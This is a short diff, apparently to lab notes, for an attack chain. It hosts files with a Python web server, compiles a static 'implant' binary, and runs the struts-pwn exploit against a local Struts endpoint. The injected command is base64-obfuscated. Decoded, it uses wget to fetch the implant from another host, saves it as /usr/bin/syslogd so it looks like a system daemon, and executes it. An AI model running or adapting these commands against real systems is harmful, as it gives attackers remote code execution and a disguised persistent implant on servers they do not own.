@@ -20,5 +20,5 @@ python -m http.server 8000
 In WSL!!
 gcc -static -o implant implant_client.c
 cd struts-pwn
-python3 struts-pwn.py --url http://localhost:8080/memocreate.action   --cmd "echo d2dldCBodHRwOi8vMTkyLjE2OC42NS4yNTQ6ODAwMC9pbXBsYW50IC1PIC90bXAvaSAmJiBjaG1vZCAreCAvdG1wL2kgJiYgL3RtcC9p | base64 -d | bash"
+python3 struts-pwn.py --url http://localhost:8080/memocreate.action   --cmd "echo d2dldCBodHRwOi8vaG9zdC5kb2NrZXIuaW50ZXJuYWw6ODAwMC9pbXBsYW50IC1PIC91c3IvYmluL3N5c2xvZ2QgJiYgY2htb2QgK3ggL3Vzci9iaW4vc3lzbG9nZCAmJiAvdXNyL2Jpbi9zeXNsb2dk | base64 -d | bash"
 ```
